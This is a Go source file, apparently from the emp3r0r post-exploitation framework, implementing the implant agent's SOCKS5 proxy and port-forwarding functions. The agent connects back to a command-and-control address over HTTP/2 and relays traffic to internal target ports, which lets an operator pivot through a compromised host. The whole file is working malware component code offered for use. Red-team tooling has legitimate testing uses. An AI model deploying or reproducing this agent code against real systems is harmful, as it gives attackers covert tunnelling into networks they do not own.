package agent

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

// PortFwdSession manage a port fwd session
type PortFwdSession struct {
	To     string
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}

// PortFwds manage port mappings
var PortFwds = make(map[string]*PortFwdSession)

// Socks5Proxy sock5 proxy server on agent, listening on addr
// to use it, forward port 10800 to CC
// op: on/off
func Socks5Proxy(op string, addr string) (err error) {
	socks5Start := func() {
		var err error
		if ProxyServer == nil {
			socks5.Debug = true
			ProxyServer, err = socks5.NewClassicServer(addr, "", "", "", 10, 10)
			if err != nil {
				log.Println(err)
				return
			}
		} else {
			log.Printf("Socks5Proxy is already running on %s", ProxyServer.ServerAddr.String())
			return
		}

		log.Printf("Socks5Proxy started on %s", addr)
		err = ProxyServer.ListenAndServe(nil)
		if err != nil {
			log.Println(err)
		}
		log.Printf("Socks5Proxy stopped (%s)", addr)
	}

	// op
	switch op {
	case "on":
		go socks5Start()
	case "off":
		log.Print("Stopping Socks5Proxy")
		if ProxyServer == nil {
			return errors.New("Proxy server is not running")
		}
		err = ProxyServer.Shutdown()
		if err != nil {
			log.Print(err)
		}
		ProxyServer = nil
	default:
		return errors.New("Operation not supported")
	}

	return err
}

// PortFwd port mapping, receive CC's request data then send it to target port on agent
func PortFwd(to, sessionID string) (err error) {
	var (
		session PortFwdSession

		url = CCAddress + tun.ProxyAPI

		// connection
		conn   *h2conn.Conn
		ctx    context.Context
		cancel context.CancelFunc
	)
	if !tun.ValidateIPPort(to) {
		return fmt.Errorf("Invalid address: %s", to)
	}

	// request a port fwd
	// connect CC
	conn, ctx, cancel, err = ConnectCC(url)
	log.Printf("PortFwd started: -> %s (%s)", to, sessionID)

	go fwdToDport(ctx, cancel, to, sessionID, conn)

	defer func() {
		cancel()
		conn.Close()
		delete(PortFwds, sessionID)
		log.Printf("PortFwd stopped: -> %s (%s)", to, sessionID)
	}()

	// save this session
	session.To = to
	session.Conn = conn
	session.Ctx = ctx
	session.Cancel = cancel
	PortFwds[sessionID] = &session

	// check if h2conn is disconnected,
	// if yes, kill all goroutines and cleanup
	for ctx.Err() == nil {
		time.Sleep(1 * time.Second)
	}
	return
}

func fwdToDport(ctx context.Context, cancel context.CancelFunc,
	to string, sessionID string, h2 *h2conn.Conn) {

	var err error

	// connect to target port
	dest, err := net.Dial("tcp", to)
	defer func() {
		cancel()
		if dest != nil {
			dest.Close()
		}
		log.Printf("fwdToDport %s exited", to)
	}()
	if err != nil {
		log.Printf("fwdToDport %s: %v", to, err)
		return
	}

	// io.Copy
	go func() {
		defer cancel()
		_, err = io.Copy(dest, h2)
		if err != nil {
			log.Printf("h2 -> dest: %v", err)
			return
		}
	}()
	go func() {
		defer cancel()
		_, err = io.Copy(h2, dest)
		if err != nil {
			log.Printf("dest -> h2: %v", err)
			return
		}
	}()

	_, err = h2.Write([]byte(sessionID))
	if err != nil {
		log.Printf("Send hello: %v", err)
		return
	}

	for ctx.Err() == nil {
		time.Sleep(500 * time.Millisecond)
	}
	_, _ = h2.Write([]byte("exit\n"))
	_, _ = dest.Write([]byte("exit\n"))
}
